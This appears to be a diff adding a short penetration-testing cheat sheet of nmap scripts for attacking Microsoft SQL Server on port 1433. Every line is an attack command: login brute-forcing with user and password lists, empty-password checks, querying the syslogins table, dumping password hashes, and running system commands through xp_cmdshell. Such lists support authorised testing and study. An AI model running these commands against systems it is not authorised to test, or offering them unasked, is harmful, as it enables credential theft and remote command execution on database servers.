@@ -1,0 +1,11 @@
+nmap script:
+------------
+
+nmap <IP> -p 1433 --script ms-sql-info      // Infos - Patches applied
+nmap <IP> -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
+nmap <IP> -p 1433 --script ms-sql-brute --script-args userdb=<userfile>,passdb=<passfile>
+nmap <IP> -p 1433 --script ms-sql-empty-password
+nmap <IP> -p 1433 --script ms-sql-query --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-query.query="SELECT * FROM master..syslogins" -oN <output-File>
+nmap <IP> -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=<username>,mssql.password=<password>
+nmap <IP> -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-xp-cmdshell.cmd="ipconfig"
+
